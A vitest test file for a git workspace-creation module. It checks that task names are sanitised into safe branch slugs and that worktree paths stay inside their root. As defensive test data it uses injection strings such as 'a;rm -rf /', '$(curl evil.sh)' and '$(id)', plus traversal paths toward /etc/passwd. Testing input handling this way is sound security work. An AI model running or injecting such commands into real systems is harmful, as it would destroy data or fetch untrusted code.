import { describe, it, expect, beforeAll, afterAll, beforeEach, afterEach, vi } from "vitest";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { promises as fs } from "node:fs";
import os from "node:os";
import path from "node:path";

const exec = promisify(execFile);

// createWorkspace reads CONFIG.sourceRepo/worktreeRoot/worktreeBase, which
// config.ts freezes from process.env at module-load time. The env vars must
// be set BEFORE the first import of ./git.js (which imports ../config.js) —
// so, unlike git.test.ts, this file dynamically imports git.js inside
// beforeAll, after a scratch "source repo" + bare "origin" remote exist and
// the env vars point at them. This is the same pattern routes.test.ts uses
// to isolate CONFIG from the real ~/.muse-glimmer / real source repo.
let sourceRepo: string;
let bareOrigin: string;
let worktreeRoot: string;
let originalMainSha: string;

let createWorkspace: typeof import("./git.js").createWorkspace;
let sanitizeTaskSlug: typeof import("./git.js").sanitizeTaskSlug;
let WorkspaceCreateError: typeof import("./git.js").WorkspaceCreateError;
let resolvesWithinRoot: typeof import("./git.js").resolvesWithinRoot;

beforeAll(async () => {
  sourceRepo = await fs.mkdtemp(path.join(os.tmpdir(), "glimmer-wc-source-"));
  bareOrigin = await fs.mkdtemp(path.join(os.tmpdir(), "glimmer-wc-origin-"));
  worktreeRoot = await fs.mkdtemp(path.join(os.tmpdir(), "glimmer-wc-worktrees-"));

  await exec("git", ["init", "-q", "-b", "main", sourceRepo]);
  await exec("git", ["config", "user.email", "t@t.com"], { cwd: sourceRepo });
  await exec("git", ["config", "user.name", "t"], { cwd: sourceRepo });
  await fs.writeFile(path.join(sourceRepo, "a.txt"), "one\n");
  await exec("git", ["add", "a.txt"], { cwd: sourceRepo });
  await exec("git", ["commit", "-q", "-m", "init"], { cwd: sourceRepo });

  await exec("git", ["init", "-q", "--bare", bareOrigin]);
  await exec("git", ["remote", "add", "origin", bareOrigin], { cwd: sourceRepo });
  await exec("git", ["push", "-q", "origin", "main"], { cwd: sourceRepo });

  originalMainSha = (await exec("git", ["rev-parse", "main"], { cwd: sourceRepo })).stdout.trim();

  process.env.GLIMMER_SOURCE_REPO = sourceRepo;
  process.env.GLIMMER_WORKTREE_ROOT = worktreeRoot;
  process.env.GLIMMER_WORKTREE_BASE = "origin/main";

  const mod = await import("./git.js");
  createWorkspace = mod.createWorkspace;
  sanitizeTaskSlug = mod.sanitizeTaskSlug;
  WorkspaceCreateError = mod.WorkspaceCreateError;
  resolvesWithinRoot = mod.resolvesWithinRoot;
});

afterAll(async () => {
  await fs.rm(sourceRepo, { recursive: true, force: true });
  await fs.rm(bareOrigin, { recursive: true, force: true });
  await fs.rm(worktreeRoot, { recursive: true, force: true });
});

describe("sanitizeTaskSlug", () => {
  it("lowercases, collapses runs of disallowed characters, and trims edges", () => {
    expect(sanitizeTaskSlug("My New Task!!")).toBe("my-new-task");
    expect(sanitizeTaskSlug("  spaced out  ")).toBe("spaced-out");
  });

  it("keeps the closed charset [a-z0-9._-] and nothing else", () => {
    // literal "-" in "-rf" is an allowed charset character, so it survives
    // as-is next to the dash the preceding bad-run (";", " ") collapses to.
    expect(sanitizeTaskSlug("a;rm -rf /")).toBe("a-rm--rf");
    expect(sanitizeTaskSlug("$(curl evil.sh)")).toBe("curl-evil.sh");
    expect(sanitizeTaskSlug("任务名 unicode")).toBe("unicode");
  });

  it("never produces a leading .. path-traversal segment even from ../x", () => {
    const slug = sanitizeTaskSlug("../x");
    expect(slug).not.toMatch(/\//); // no slash ever survives -> can't become a path segment
    expect(slug).not.toMatch(/\.\./); // and no consecutive dots survive either (git rejects them as a ref component)
    expect(slug).toBe("x");
  });

  it("rejects empty-after-sanitize (all-disallowed input) by producing an empty string", () => {
    expect(sanitizeTaskSlug("!!!///???")).toBe("");
    expect(sanitizeTaskSlug("")).toBe("");
  });

  it("caps length to 40 characters", () => {
    const slug = sanitizeTaskSlug("x".repeat(50));
    expect(slug.length).toBeLessThanOrEqual(40);
  });
});

describe("resolvesWithinRoot", () => {
  // The one real call site (workspace = worktreeRoot joined with a
  // slug-derived, slash-free directory name) can never actually trip this —
  // exercise the pure function directly with adversarial input instead, so
  // the containment assertion in createWorkspace has real coverage rather
  // than being implied-but-untested dead code.
  it("accepts a path genuinely inside root", () => {
    expect(resolvesWithinRoot("/Users/danielqazi", "/Users/danielqazi/glimmer-x-1")).toBe(true);
  });

  it("rejects a path outside root, including a same-prefix sibling", () => {
    expect(resolvesWithinRoot("/Users/danielqazi", "/etc/passwd")).toBe(false);
    // "/Users/danielqazi-evil" starts with the string "/Users/danielqazi"
    // but is NOT inside it — the trailing path.sep in the real check exists
    // precisely to catch this case.
    expect(resolvesWithinRoot("/Users/danielqazi", "/Users/danielqazi-evil")).toBe(false);
  });

  it("rejects a traversal that escapes root via ..", () => {
    expect(resolvesWithinRoot("/Users/danielqazi/worktrees", "/Users/danielqazi/worktrees/../../etc/passwd")).toBe(false);
  });
});

// Must run before any other describe block in this file that calls
// createWorkspace successfully: this test needs refs/heads/glimmer/* to not
// exist yet in the shared sourceRepo fixture, so it can create a plain
// branch literally named "glimmer" (which a prior successful call already
// forecloses, since that puts refs under refs/heads/glimmer/*).
describe("createWorkspace — D/F ref conflict is a server-side condition, not a bad taskName", () => {
  it("maps a non-ref-name-rejection worktree-add failure to 500, not 400", async () => {
    // A plain branch literally named "glimmer" makes refs/heads/glimmer a
    // FILE, blocking git from ever creating refs/heads/glimmer/<anything> —
    // the exact repro from the security review: this must never blanket-map
    // to 400 (which would send the user into an infinite rename loop trying
    // to "fix" a taskName that was never the problem).
    await exec("git", ["branch", "glimmer"], { cwd: sourceRepo });
    try {
      const err = await createWorkspace("df conflict task").catch((e) => e);
      expect(err).toBeInstanceOf(WorkspaceCreateError);
      expect(err.status).toBe(500);
      expect(err.partial).toBeUndefined(); // worktree add itself failed -> nothing was created
    } finally {
      await exec("git", ["branch", "-D", "glimmer"], { cwd: sourceRepo });
    }
  });
});

describe("createWorkspace — success path", () => {
  it("creates a branch+worktree with HEAD==origin/main and a clean working tree, and no upstream configured", async () => {
    const result = await createWorkspace("integration success task");

    expect(result.branch).toMatch(/^glimmer\/integration-success-task-\d{8}-\d{6}$/);
    expect(result.baselineSha).toBe(originalMainSha);
    expect(resolvesWithinRoot(worktreeRoot, result.workspace)).toBe(true);

    const headSha = (await exec("git", ["rev-parse", "HEAD"], { cwd: result.workspace })).stdout.trim();
    const currentBranch = (await exec("git", ["branch", "--show-current"], { cwd: result.workspace })).stdout.trim();
    const status = (await exec("git", ["status", "--porcelain"], { cwd: result.workspace })).stdout;
    // Reference script's 4th verification check: --no-track must mean no
    // upstream, not just no explicit tracking config.
    const upstream = await exec("git", ["rev-parse", "--abbrev-ref", "@{upstream}"], { cwd: result.workspace })
      .then((r) => r.stdout.trim())
      .catch(() => "");

    expect(headSha).toBe(originalMainSha);
    expect(currentBranch).toBe(result.branch);
    expect(status.trim()).toBe("");
    expect(upstream).toBe("");
  });
});

describe("createWorkspace — slug injection attempts stay contained under worktreeRoot", () => {
  const attempts = ["../evil", "a;rm -rf /", "$(id)", "任务名", "x".repeat(50)];

  for (const raw of attempts) {
    it(`"${raw}" resolves inside worktreeRoot, or is cleanly rejected`, async () => {
      try {
        const result = await createWorkspace(raw);
        const resolved = path.resolve(result.workspace);
        expect(resolved.startsWith(path.resolve(worktreeRoot) + path.sep)).toBe(true);
      } catch (err: any) {
        expect(err).toBeInstanceOf(WorkspaceCreateError);
        // 400: taskName sanitized to empty, or git itself rejected the
        // derived ref name. 500: the (currently unreachable via this input —
        // the slug's closed charset forbids "/") containment guard, which
        // guards CONFIG.worktreeRoot (server config), not user input.
        expect([400, 500]).toContain(err.status);
      }
    });
  }

  it("rejects an empty-after-sanitize taskName with a 400, not a git call", async () => {
    await expect(createWorkspace("!!!")).rejects.toMatchObject({ status: 400 });
  });
});

describe("createWorkspace — duplicate branch name", () => {
  it("errors instead of touching the existing branch/worktree", async () => {
    // Pin the clock so both calls compute the identical branch/worktree name
    // (the real timestamp component is second-granular) — this forces a
    // genuine "branch already exists" collision deterministically rather
        // than relying on both real calls landing in the same wall-clock second.
    vi.useFakeTimers({ toFake: ["Date"] });
    vi.setSystemTime(new Date("2026-08-21T12:00:00Z"));
    try {
      const first = await createWorkspace("dup task");
      expect(first.branch).toContain("dup-task");

      await expect(createWorkspace("dup task")).rejects.toMatchObject({ status: 409 });
    } finally {
      vi.useRealTimers();
    }
  });
});

describe("createWorkspace — concurrency", () => {
  it("returns 409 for a second call fired while the first is still in flight", async () => {
    const p1 = createWorkspace("concurrent-a");
    const p2 = createWorkspace("concurrent-b");

    const [r1, r2] = await Promise.allSettled([p1, p2]);
    expect(r1.status).toBe("fulfilled");
    expect(r2.status).toBe("rejected");
    if (r2.status === "rejected") {
      expect(r2.reason).toBeInstanceOf(WorkspaceCreateError);
      expect(r2.reason.status).toBe(409);
    }
  });

  it("releases the lock after completion, so a later call succeeds", async () => {
    const result = await createWorkspace("after-lock-release");
    expect(result.branch).toContain("after-lock-release");
  });
});

// The fetch-failure (502) and sanity-precheck (500) scenarios each need a
// DIFFERENT CONFIG.sourceRepo than this file's, and CONFIG is frozen from
// process.env at first module load per test file (vitest gives each test
// file its own module registry) — so those live in their own files:
// createWorkspaceFetchFailure.test.ts and createWorkspaceSanityPrecheck.test.ts.
